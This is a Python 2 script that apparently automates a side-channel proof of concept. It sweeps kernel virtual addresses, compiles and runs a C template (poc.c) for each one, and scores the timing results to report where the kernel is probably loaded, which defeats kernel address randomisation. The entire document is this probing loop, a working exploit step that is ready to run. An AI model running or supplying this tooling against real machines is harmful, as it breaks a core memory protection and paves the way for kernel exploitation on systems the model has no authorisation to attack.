#!/usr/bin/python

import subprocess

# You might need to configure these.
start = 0xffffffff80000000
end =   0xfffffffff0000000
step =  0x0000000001000000
threshold = 0.3

with open('poc.c') as f:
  template = f.read()

def measure_score(addr):
  test = template[:]
  test = test.replace('0xffffffffffffffff', addr)
  with open('tmp.c', 'w') as f:
    f.write(test)
  subprocess.call(['gcc', '-O3', 'tmp.c'])
  p = subprocess.Popen('./a.out', shell=False, stdout=subprocess.PIPE)
  score = p.stdout.readline().strip()
  return float(score)

addrs = []

addr = start
while addr <= end:
  addrs.append(addr)
  addr += step

# The heuristics used here is: if out of 5 score measures for an address
# all are lower than the threshold and at least 3 measures resulted in 0.0,
# then this address in where the kernel is. Best effort.

for addr in addrs:
  str_addr = hex(addr)[:-1]
  nulls = 0
  rejected = False

  for i in xrange(5):
    score = measure_score(str_addr)
    print str_addr, score
    if score > threshold:
      rejected = True
      break
    if score == 0.0:
      nulls += 1

  if rejected:
    print str_addr, 'rejected'
    continue

  if nulls <= 2:
    print str_addr, 'rejected'
    continue

  print str_addr, 'accepted'
  print 'the kernel is probably at', str_addr
  break
